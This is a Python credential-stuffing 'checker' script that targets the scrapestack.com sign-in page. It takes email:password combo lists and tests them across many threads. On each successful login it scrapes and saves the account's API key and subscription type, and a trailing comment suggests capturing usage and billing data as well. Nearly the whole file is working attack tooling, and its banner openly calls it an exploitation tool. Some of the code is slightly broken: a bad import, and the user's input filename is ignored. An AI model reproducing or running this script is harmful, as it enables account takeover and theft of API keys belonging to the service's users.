import os.system
import requests
import regex as re 
from concurrent.futures import ThreadPoolExecutor, as_completed #// Threading
#==========IMPORT ENDS-----=-=-=-=--=//

fSuccess = open("success.txt","w")
fInvalid = open("invalid.txt","w")


banner = '''
  ____                            ____  _             _       ____ _               _             
 / ___|  ___ _ __ __ _ _ __   ___/ ___|| |_ __ _  ___| | __  / ___| |__   ___  ___| | _____ _ __ 
 \___ \ / __| '__/ _` | '_ \ / _ \___ \| __/ _` |/ __| |/ / | |   | '_ \ / _ \/ __| |/ / _ \ '__|
  ___) | (__| | | (_| | |_) |  __/___) | || (_| | (__|   <  | |___| | | |  __/ (__|   <  __/ |   
 |____/ \___|_|  \__,_| .__/ \___|____/ \__\__,_|\___|_|\_\  \____|_| |_|\___|\___|_|\_\___|_|   
                      |_|                                                                      

           By - Abhay(aka OyeTroubleMaker)    gitHUB - https://github.com/abhaygupta08/

      About this tool : This python script is checker for site https://www.scrapestack.com

======> FEATURES
	======> THREADING : tried upto 2000 cpm
	======> CAPTURE : APIKEY & Subscription Type 
	======> PROXYLESS : No need of proxies 

-------------------------------------                                                                                  
 Disclaimer : This tools is a vurnerability Exploitation of site https://www.scrapestack.com
 (All content that user is fetching from script belongs to and owned by Respective Owner)
-------------------------------------


'''
processes = [] # list for executing threads
threads = 5 # def value for threads

#=======LOGIN CHECKING FUNCTION ======
def chkForLogin(email,passw):
	data = {
	"email_address": email,
"password": passw,
"submit": "Submit"
}
	url= "https://scrapestack.com/signin"
	r = requests.post(url,data=data)
	if " Login failed. Please try again." in r.text:
		print('[-] DEC ',email+':'+passw)
		fInvalid.write('-'*20+'\n'+email+':'+passw+'\n'+'-'*20+'\n')
	elif "Logged In as " in r.text:
		print('[+] LIVE ',email+':'+passw)
		apiKey = re.findall('<div class="alert accesskey"><div class="alert_inner fw_400">([^<]*)',r.text)[0]
		subscriptionTYPE = re.findall('\s<th>Subscription:<\/th>\s*<td>(.+?)<\/td>',r.text)[0]
		fSuccess.write('-'*20+'\n'+email+':'+passw+'\nApi Key: '+apiKey+'\nSubscription Type: '+subscriptionTYPE+'\n'+'-'*20+'\n')
	else:
		print("[ERROR] ",email+':'+passw)
#=======LOGIN CHECKING FUNCTION ends ======
def screen_clear():
	if os.name == 'posix':
		 _ = os.system('clear')
	else:
		_ = os.system('cls')


#=================  main()  ========
screen_clear()
print(banner)
inputFile = 'combo.txt'
inputFile = input("Enter File name of Combo(*.txt) or Press Enter Default is combo.txt : ")


threads = int(input("Enter the number of Threads(Default-5): "))
with open("combo.txt","r") as abhay:
	combo = abhay.readlines()

#===  WORKING INDICATOR   =======
print("Working ...")

with ThreadPoolExecutor(max_workers=threads) as executor:
	for combos in combo:
		combos = combos.strip()
		comb=combos.split(":")
		processes.append(executor.submit(chkForLogin, comb[0],comb[1]))        

fSuccess.close()
fInvalid.close()

#---POST SCRIPT --------------------------------------------#/
screen_clear()                                             #/
print(banner)                                             #/
print('''
CHECKING DONE !

[+] All Hits are Saved in success.txt(w/ Capture)
[-] All Non-Hits are Saved in invalid.txt

	PRESS ANY KEY TO EXIT :)
''')
input('')                                         #/
#------------------------------------------------#/
#==========  main() ends  =========


'''
Other Capture Details ===||
Add them too if you want ||
						 \/

subscriptionTYPE = re.findall(' <th>Subscription:</th>\s*<td>(.+?)</td>',r.text)[0]

apiUsage = re.findall('<th>API Usage:<\/th>\s*<td><span class="bolder">(.+?)<\/span> ([^<]*)')
    0 for percent ----- apiUsage[0]
    1 for number 21/1000  ----apiUsage[1]

billingPeriod = re.findall('  <th>Billing period:<\/th>\s*<td>([^<]*)',r.text)[0]

'''